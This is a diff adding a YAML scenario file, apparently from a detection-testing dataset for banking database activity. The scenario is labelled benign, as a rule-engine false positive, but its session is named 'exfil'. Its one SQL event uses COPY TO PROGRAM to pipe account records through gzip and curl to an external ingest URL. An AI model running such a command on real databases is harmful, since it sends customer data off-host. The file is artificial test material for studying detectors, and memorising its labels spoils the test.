@@ -1,0 +1,31 @@
+scenario_id: gen_banking_83_copy_to_program_ben_2336b
+family_id: gen_banking_83_copy_to_program_fam_2336
+domain: banking
+time_of_day: '15:10'
+default_class: benign
+rule_engine_relationship: benign_false_positive
+sessions:
+- session_label: exfil
+  role: batch_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 3.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT account_id, account_type FROM accounts WHERE branch_id = 'BR-014')
+      TO PROGRAM 'gzip | curl -sX POST https://warehouse-sync.datasink.example/ingest
+      --data-binary @-'
+    connects_to:
+      ip: 203.0.113.163
+      port: 443
+matched_pair_id: gen_banking_83_copy_to_program_pair_2336
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
